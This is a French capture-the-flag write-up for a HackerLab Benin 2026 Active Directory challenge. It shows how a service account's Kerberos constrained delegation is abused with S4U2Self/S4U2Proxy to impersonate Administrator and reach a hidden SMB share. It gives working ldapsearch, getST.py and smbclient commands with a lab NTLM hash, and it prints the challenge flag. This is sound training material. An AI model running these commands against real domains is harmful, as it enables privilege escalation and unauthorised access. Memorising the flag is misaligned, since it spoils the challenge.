---
title: "Sealed Order Q11 · Délégation contrainte S4U"
platform: "HackerLab Benin 2026"
category: "ad"
difficulty: "—"
points: 0
os: "Windows"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/ad/sealed-order-q11.md"
tags: [hackerlab-benin-2026, ad]
status: published
---

# Sealed Order : Q11 · Délégation contrainte S4U2Self/S4U2Proxy

**Catégorie** : AD  
**Flag** : `HLB2026{CONSTRAINED_DELEGATION_S4U_SERVICE_IMPERSONATION}`

## TL;DR

Le compte `svc_mssql` a l'attribut `TRUSTED_TO_AUTH_FOR_DELEGATION` et `msDS-AllowedToDelegateTo: cifs/FS01`. On obtient son hash NTLM via les étapes précédentes, puis S4U2Self + S4U2Proxy permettent d'impersonner Administrator et d'accéder au partage caché `SQL-Delegated`.

## Prérequis

Le hash NTLM de `svc_mssql` est `cfc04d466ea6723e12b6bbd51a1857b3`, récupéré lors de l'énumération du domaine. L'attribut de délégation est lisible par LDAP :

```bash
ldapsearch -H ldap://<DC_IP> -b "DC=valdoria,DC=fbi,DC=lab" \
  "(sAMAccountName=svc_mssql)" msDS-AllowedToDelegateTo userAccountControl
```

Résultat : `msDS-AllowedToDelegateTo: cifs/FS01.valdoria.fbi.lab` avec UAC `TRUSTED_TO_AUTH_FOR_DELEGATION`.

## Exploitation

S4U2Self obtient un ticket de service pour `svc_mssql` impersonant `Administrator`, puis S4U2Proxy l'échange contre un ticket CIFS pour FS01 :

```bash
getST.py -dc-ip <DC_IP> -spn cifs/FS01.valdoria.fbi.lab \
  -impersonate Administrator \
  -hashes :cfc04d466ea6723e12b6bbd51a1857b3 \
  VALDORIA.FBI.LAB/svc_mssql
```

Le ticket Kerberos est exporté dans `Administrator.ccache`. On accède ensuite au partage :

```bash
export KRB5CCNAME=Administrator.ccache
smbclient //FS01.valdoria.fbi.lab/SQL-Delegated -k
```

Le partage `SQL-Delegated` n'est pas browseable (il n'apparaît pas dans `net share` ni dans `smbclient -L`). Son nom exact est fourni par la plateforme comme indice au niveau Q11.

Le flag est dans le partage :

```
HLB2026{CONSTRAINED_DELEGATION_S4U_SERVICE_IMPERSONATION}
```

## Piège

L'instance Q12 (`172.28.18.0/24`) a un FS01 standalone qui n'est pas la cible Q11. Le ticket Kerberos généré pour `FS01.valdoria.fbi.lab` échouera sur ce FS01 différent. Ne pas confondre les deux instances.

## À retenir

Un share non-browseable peut exister sans apparaître dans les énumérations. Quand un indice de challenge cite un nom de dossier ou de partage, tenter directement ce nom via `smbclient //host/nom -k` avant de bruteforcer.
